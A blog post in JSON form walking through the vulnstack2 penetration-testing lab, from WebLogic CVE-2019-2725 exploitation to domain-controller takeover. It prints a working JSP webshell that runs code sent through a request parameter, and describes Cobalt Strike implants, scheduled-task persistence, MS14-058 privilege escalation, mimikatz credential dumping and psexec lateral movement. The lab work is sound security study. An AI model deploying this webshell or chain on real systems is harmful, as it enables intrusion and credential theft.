{"title":"vulnstack2靶场通关笔记","slug":"vulnstack2","date":"2021-03-01T08:35:59.000Z","updated":"2021-03-01T10:07:17.751Z","comments":true,"path":"api/articles/vulnstack2.json","photos":[],"link":"","excerpt":null,"covers":["../static/images/image-20210301170011107.png","../static/images/image-20210301170312721.png","../static/images/image-20210301170529355.png","../static/images/image-20210301171754363.png","../static/images/image-20210301172034965.png","../static/images/image-20210301172118946.png","../static/images/image-20210301172157655.png","../static/images/image-20210301174638977.png","../static/images/image-20210301174859722.png","../static/images/image-20210301175350786.png","../static/images/image-20210301175549403.png","../static/images/image-20210301180519745.png","../static/images/image-20210301180638661.png"],"content":"<h2 id=\"环境介绍\"><a class=\"markdownIt-Anchor\" href=\"#环境介绍\"></a> 环境介绍</h2>\n<p>​\t三个靶机，分别为：</p>\n<p>​\t\tDC 机： 内网ip 10.10.10.10 Windows 2012</p>\n<p>​\t\tWEB：   内网ip 10.10.10.80     外网ip 192.168.111.80      Windows 2008</p>\n<p>​\t\tPC：       内网ip 10.10.10.201  外网ip 192.168.111.201\tWindows7</p>\n<p>​\t小trick：</p>\n<p>​\t\t登录密码都是1qaz@WSX，web那个有问题，恢复快照到1.3然后登录就行了，然后开启一下weblogic。</p>\n<h2 id=\"预渗透\"><a class=\"markdownIt-Anchor\" href=\"#预渗透\"></a> 预渗透</h2>\n<p>​\tnmap扫描网站可扫描到7001端口开启：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">❯ sudo nmap -sS 192.168.111.80        </span><br><span class=\"line\">[sudo] b0ring 的密码：</span><br><span class=\"line\">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-01 16:43 CST</span><br><span class=\"line\">Nmap scan report for 192.168.111.80</span><br><span class=\"line\">Host is up (0.0015s latency).</span><br><span class=\"line\">Not shown: 988 filtered ports</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">80&#x2F;tcp    open  http</span><br><span class=\"line\">135&#x2F;tcp   open  msrpc</span><br><span class=\"line\">139&#x2F;tcp   open  netbios-ssn</span><br><span class=\"line\">445&#x2F;tcp   open  microsoft-ds</span><br><span class=\"line\">1433&#x2F;tcp  open  ms-sql-s</span><br><span class=\"line\">3389&#x2F;tcp  open  ms-wbt-server</span><br><span class=\"line\">7001&#x2F;tcp  open  afs3-callback</span><br></pre></td></tr></table></figure>\n<p>​\t访问后发现是weblogic服务：</p>\n<p><img src=\"../static/images/image-20210301170011107.png\" alt=\"image-20210301170011107\" /></p>\n<p>​\t使用<a href=\"https://github.com/rabbitmask/WeblogicScan\">WeblogicScan</a>来检测是否存在已知的Weblogic漏洞，发现存在CVE-2019-2725等：</p>\n<p><img src=\"../static/images/image-20210301170312721.png\" alt=\"image-20210301170312721\" /></p>\n<p>​\t使用<a href=\"https://github.com/21superman/weblogic_exploit\">weblogic_exploit</a>来利用该漏洞：</p>\n<p><img src=\"../static/images/image-20210301170529355.png\" alt=\"image-20210301170529355\" /></p>\n<p>​\t引申一个小trick，自己试出来的，就是怎么找weblogic的上传路径，大概就是看这个目录下有啥文件夹（有更好的方法请私信我）：</p>\n<p><img src=\"../static/images/image-20210301171754363.png\" alt=\"image-20210301171754363\" /></p>\n<p>然后上传一个蚁剑shell：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import&#x3D;&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    class U extends ClassLoader&#123;</span><br><span class=\"line\">        U(ClassLoader c)&#123;</span><br><span class=\"line\">            super(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public Class g(byte []b)&#123;</span><br><span class=\"line\">            return super.defineClass(b,0,b.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    BASE64Decoder decoder&#x3D;new sun.misc.BASE64Decoder();</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String cls&#x3D;request.getParameter(&quot;ant&quot;);</span><br><span class=\"line\">    if(cls!&#x3D;null)&#123;</span><br><span class=\"line\">    new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<p>然后就能连蚁剑：</p>\n<p><img src=\"../static/images/image-20210301172034965.png\" alt=\"image-20210301172034965\" /></p>\n<p>用cs创建一个listener：</p>\n<p><img src=\"../static/images/image-20210301172118946.png\" alt=\"image-20210301172118946\" /></p>\n<p>创建个木马，用这个listener：</p>\n<p><img src=\"../static/images/image-20210301172157655.png\" alt=\"image-20210301172157655\" /></p>\n<p>上传到目标服务器后，用蚁剑的虚拟shell添加计划任务：</p>\n<p><img src=\"../static/images/image-20210301174638977.png\" alt=\"image-20210301174638977\" /></p>\n<p>等待cs上线：</p>\n<p><img src=\"../static/images/image-20210301174859722.png\" alt=\"image-20210301174859722\" /></p>\n<p>使用ms14-058 提权：</p>\n<p><img src=\"../static/images/image-20210301175350786.png\" alt=\"image-20210301175350786\" /></p>\n<p>有了system权限，mimikaz直接抓凭证：</p>\n<p><img src=\"../static/images/image-20210301175549403.png\" alt=\"image-20210301175549403\" /></p>\n<p>直接用psexec登录域控：</p>\n<p><img src=\"../static/images/image-20210301180519745.png\" alt=\"image-20210301180519745\" /></p>\n<p><img src=\"../static/images/image-20210301180638661.png\" alt=\"image-20210301180638661\" /></p>\n<p>后面更新学习下其他攻击思路……（未完待续）</p>\n","categories":[],"tags":[{"name":"web","slug":"web","count":4,"path":"api/tags/web.json"}]}